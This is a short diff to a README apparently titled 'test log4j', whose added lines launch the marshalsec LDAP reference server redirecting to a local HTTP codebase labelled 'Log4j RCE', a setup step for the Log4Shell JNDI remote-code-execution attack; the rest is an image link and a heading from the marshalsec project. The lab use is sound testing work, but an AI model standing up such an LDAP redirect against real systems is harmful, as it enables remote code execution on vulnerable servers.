@@ -1,6 +1,9 @@
 # test log4j
 ![2L(N)YB)}@E%DNTXQG7J22X](https://user-images.githubusercontent.com/37278360/145526150-5b05157d-5be7-47ff-a9d5-b7713e7a9520.png)
 
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  "http:127.0.0.1:8888/#Log4j
+RCE"
+
 # Java Unmarshaller Security - Turning your data into code execution
 
 ## Paper
